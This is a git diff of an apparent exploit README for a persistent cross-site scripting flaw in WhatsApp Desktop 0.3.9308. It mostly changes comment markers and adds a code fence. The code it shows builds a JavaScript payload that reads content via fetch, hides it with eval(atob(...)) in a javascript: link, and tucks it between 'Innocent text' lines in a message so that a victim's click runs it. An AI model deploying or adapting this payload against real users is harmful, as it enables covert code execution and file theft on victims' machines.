@@ -3,19 +3,19 @@
 
 ##### Description:
 ----------------------
-- # Title: WhatsApp Desktop 0.3.9308 - Persistent Cross-Site Scripting
+- // Title: WhatsApp Desktop 0.3.9308 - Persistent Cross-Site Scripting
 
-- # Date: 2020-01-21
+- // Date: 2020-01-21
 
-- # Vendor Homepage: https://www.whatsapp.com
+- // Vendor Homepage: https://www.whatsapp.com
 
-- # Software Link: https://web.whatsapp.com/desktop/windows/release/x64/WhatsAppSetup.exe
+- // Software Link: https://web.whatsapp.com/desktop/windows/release/x64/WhatsAppSetup.exe
 
-- # Software Link: https://web.whatsapp.com/desktop/mac/files/WhatsApp.dmg
+- // Software Link: https://web.whatsapp.com/desktop/mac/files/WhatsApp.dmg
 
-- # Version: 0.3.9308
+- // Version: 0.3.9308
 
-- # Tested On: Mac OS, Windows, iPhone
+- // Tested On: Mac OS, Windows, iPhone
 
 ##### Get a license
 ----------------------
@@ -38,8 +38,10 @@
 
 - // result: a message should be sent to the victim that once is clicked will execute the payload above
 
-##### CODE:
+## Usage
 ----------------------
+
+```javascript
 var payload = `(async function() {
 alert(navigator.userAgent);
 (async function() {
@@ -49,14 +51,20 @@ const t = await r.text();
 alert(t);
 }())
 }())`;
+
 payload = `javascript:"https://example.com";eval(atob("${btoa(payload)}"))`;
+
 e.__x_matchedText = payload;
+
 e.__x_body = `
 Innocent text
+
 ${payload}
+
 More Innocent text
 `;
 
+```
 
 #####video:
 ----------------------
